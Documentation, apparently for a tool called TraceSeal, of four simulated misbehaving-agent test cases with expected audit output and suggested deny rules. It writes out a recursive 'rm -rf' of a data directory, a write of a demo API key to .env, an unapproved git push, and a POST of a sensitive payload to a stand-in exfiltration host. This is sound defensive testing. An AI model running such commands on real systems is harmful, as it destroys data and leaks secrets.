# TraceSeal Agent 事故测试案例

> 当前已实现并自动测试：delete / env / git / http 4 类案例。  
> 当前 CLI：`python -m traceseal run/replay/explain/dashboard-data`。

## 当前落地状态

| 案例 | 状态 | 自动测试 | 风险规则 |
|---|---|---|---|
| `bad_agent_delete.py` | 已实现 | `test_bad_agent_delete_detected` | `dangerous_delete` |
| `bad_agent_env.py` | 已实现 | `test_env_write_detected` | `env_write` |
| `bad_agent_git.py` | 已实现，git push 离线模拟 | `test_git_push_detected` | `git_push` |
| `bad_agent_http.py` | 已实现，HTTP POST 离线模拟 | `test_http_post_recorded` | `suspicious_http_post` |
| `bad_agent_cascade.py` | 后续 | 暂无 | 待补充 |

---

## 案例 1：误删数据目录

### 文件

`examples/bad_agent_delete.py`

### 错误行为

Agent 创建 `data/important.txt` 后执行：

```python
subprocess.run(["rm", "-rf", "data/"], check=True)
```

### TraceSeal 应记录

| 事件 | 内容 | 风险 |
|---|---|---|
| `file.write` | `data/important.txt` | low |
| `shell` | `rm -rf data/` | critical / `dangerous_delete` |
| `file_changes` | `data/` 和 `data/important.txt` deleted | critical |

### explain 关键输出

```text
首次有害工具调用:
[evt_0003] shell: rm -rf data/

原因:
- 请求递归强制删除: data/
- 删除了受保护路径: data/
- 命中策略规则: dangerous_delete

建议策略:
deny shell "rm -rf data/**"
```

---

## 案例 2：写入敏感配置文件

### 文件

`examples/bad_agent_env.py`

### 错误行为

Agent 写入 `.env`：

```python
Path(".env").write_text("OPENAI_API_KEY=sk-demo-secret\n")
```

### TraceSeal 应记录

| 事件 | 内容 | 风险 |
|---|---|---|
| `file.write` | `.env` | high / `env_write` |

### explain 关键输出

```text
首次有害工具调用:
[evt_0002] file.write: .env

原因:
- 敏感环境配置文件被修改: .env
- 修改了受保护的环境配置文件
- 命中策略规则: env_write

建议策略:
deny file_write ".env*"
```

---

## 案例 3：Git push 风险

### 文件

`examples/bad_agent_git.py`

### 错误行为

Agent 尝试执行：

```python
subprocess.run("git push origin main", shell=True, capture_output=True)
```

### 安全处理

TraceSeal SDK 会识别 `git push` 并离线模拟，**不会真实推送远端**。

### explain 关键输出

```text
首次有害工具调用:
[evt_0002] shell: git push origin main

原因:
- 请求远程 git push
- 命中策略规则: git_push

建议策略:
require_approval git "push"
```

---

## 案例 4：HTTP POST 数据外传

### 文件

`examples/bad_agent_http.py`

### 错误行为

Agent 构造敏感 payload 并 POST 到外部 URL：

```python
urllib.request.Request(
    "https://exfil.example.invalid/collect",
    data=payload,
    method="POST",
)
```

### 安全处理

demo 默认设置 `TRACESEAL_OFFLINE_HTTP=1`，SDK 记录 HTTP 事件并返回 fake response，**不会真实访问外网**。

### explain 关键输出

```text
首次有害工具调用:
[evt_0002] http: POST https://exfil.example.invalid/collect

原因:
- 可疑的出站 HTTP POST: POST https://exfil.example.invalid/collect
- 命中策略规则: suspicious_http_post

建议策略:
deny http "POST https://exfil.example.invalid/collect"
```

---

## 运行全部案例

```powershell
python -m traceseal run python examples/bad_agent_delete.py
python -m traceseal explain runs/latest
python -m traceseal replay runs/latest

python -m traceseal run python examples/bad_agent_env.py
python -m traceseal explain runs/latest

python -m traceseal run python examples/bad_agent_git.py
python -m traceseal explain runs/latest

python -m traceseal run python examples/bad_agent_http.py
python -m traceseal explain runs/latest

python -m traceseal dashboard-data runs/latest
python -m unittest discover -s tests -v
```
